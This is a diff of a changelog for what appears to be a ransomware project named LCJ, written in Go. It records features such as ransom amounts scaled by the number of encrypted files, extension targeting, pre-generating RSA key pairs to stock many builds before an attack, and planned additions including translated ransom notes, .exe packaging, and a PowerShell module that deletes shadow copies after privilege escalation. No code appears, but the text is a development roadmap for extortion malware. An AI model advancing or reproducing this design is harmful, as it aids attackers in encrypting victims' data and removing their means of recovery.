@@ -1,26 +1,39 @@
 <h1> Changelog</h1>
-- Added decryption, encryption folder <br>
-- Added decryptor.go <br>
-- Added languages folder, containing 14 languages. See README in this folder for more informations
 <ul>
-    <li>With the help of a private RSA key, you can decrypt your files</li>
-    <li>The decryption program will decrypt the files in the order that they appear on the program</li>
-    <li>Like the encryption program, it will delete the .LCJ files, but will not zero the files before</li>
-    <li>The decryption program will decrypt the encrypted key file, in order to be able to work</li>
+    <li>The ransom is now calculated on how many files it encrypted (multiplied by 1.25)</li>
+    <li>LCJ can now encrypt specific extensions</li>
+    <li>Addressed some issues with the KRAL module</li>
 </ul>
-- Deleted functions in both encryptor/decryptor program, to make them the lighter possible</br>
 
-<h2>The KRAL module</h2>
-- File name : key_changer.go <br>
-The KRAL module is a program that generates random key pairs, and puts the public key in
-encryptor, and the private key in decryptor. It does this n times, in order to have a stock of
-ranswomwares before the attack.
-
-<h1> Upcoming </h1>
-- Automation xxx (add name for the script)<br>
+<h2>Languages</h2>
 <ul>
-    <li>Generate RSA key pairs</li>
-    <li>Create a new LCJ executable (encryptor/decryptor) files with newly created RSA key pairs</li>
-    <li>Change the public key in encryptor; change the prvate key in decryptor</li>
-    <li>Put the 2 new executables in folder</li>
+    <li>Changed some sentences, still not done</li>
+    <li></li>
+    <li></li>
 </ul>
+
+<h2> Upcoming </h2>
+
+<ul>
+    <li>After the new encryptor and decryptor is made, turn them into ".exe"</li>
+    <li>Correction of the ransomware message</li>
+    <li>Ransomware message translated in other languages</li>
+    <li>Not encrypting the default folders contained in the C: directory</li>
+    <li>EPM module (deleting the shadow copies)
+        <ul>
+            <li>Translated by Execution Policy Modifier</li>    
+            <li>Go code that will spawn a powershell script before encrypting the system</li>    
+            <li>It's job is to delete shadow copies after the privilege escalation script has been completed</li>    
+            <li>It will add an entry in the Window's Regedit in order to work successfully</li>    
+        </ul>
+    </li>
+    <li></li>
+</ul>
+
+Files changed : 
+    - encryptor.go
+    - lang.fr
+
+Files Added :
+    - W_default_files
+    -- File that stores the default root folder, so that it won't be deleted when the ransomware will start his job
